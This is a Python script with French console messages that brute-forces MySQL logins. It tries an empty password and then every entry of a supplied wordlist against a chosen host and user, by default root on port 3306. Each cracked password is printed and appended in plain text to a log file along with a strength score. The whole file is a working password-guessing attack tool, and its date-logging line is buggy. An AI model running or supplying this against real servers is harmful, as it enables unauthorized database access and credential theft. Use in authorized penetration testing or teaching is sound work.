import sys
import argparse

import MySQLdb
from datetime import datetime

PATH_LOG = "Log.txt"

def pass_crit(password):
    res = 0
    isupper = False
    islower = False
    isdigit = False
    for letter in password:
        if letter.isupper():
            isupper = True
            res = res + 1
        if letter.islower():
            islower = True
            res = res + 1
        if letter.isdigit():
            isdigit = True
            res = res + 1
        if not letter.isdigit() and not letter.isupper() and not letter.islower() and not letter.isspace():
            res = res + 1
    if isupper and islower and isdigit:
        res = res + 1
    if len(password) > 6:
        res = res + 1
    return res

def makelog(host, user, password, difficult):
    with open(PATH_LOG, 'a') as file:
        today = datetime.date.today()
        date = today.strftime("%d/%m/%Y")
        file.write("\n[" + date + "]-------------------------------")
        file.write("host :" + str(host))
        file.write("user :" + str(user))
        file.write("password :" + str(password))
        file.write("Difficulté du mdp :" + str(difficult))

    file.close()

def connect(host, user, password, port):
    try:
        MySQLdb.connect(host=host, port=port, user=user, password=password)
        print("Password :", password, " User :", user)
        difficult = pass_crit(password)
        print("Dificulté du mot de passe : " + str(difficult))
        makelog(host, user, password, difficult)
        return True
    except:
        return False

def brutforce(path_pass, user, host):
    try:
        port = 3306  

        print("Test de connexion sur :", host, port, " avec un password vide")
        if connect(host, user, "", port):
            return True
        else:
            print("Aucun résultat")

        print("Lancement du Brut force")
        with open(path_pass) as file:
            for password in file:
                password = password.replace("\n", "")
                if connect(host, user, password, port):
                    return True
    except KeyboardInterrupt:
        print("Erreur")
        sys.exit()

def main():
    try:
        args = argparse.ArgumentParser()
        args.add_argument("--host", dest="host", type=str, default="localhost")
        args.add_argument("-u", "--user", dest="user", type=str, default="root")
        args.add_argument("-p", "--passwords_file", dest="passwords", type=str, required=True)
        args = args.parse_args()

        print("Lancement du brute force")
        result = brutforce(args.passwords, args.user, args.host)

        if result:
            print("Connexion établie")
        else:
            print("Le brute force a échoué")
        sys.exit()
    except KeyboardInterrupt:
        print("Erreur")
        sys.exit()

if __name__ == "__main__":
    main()
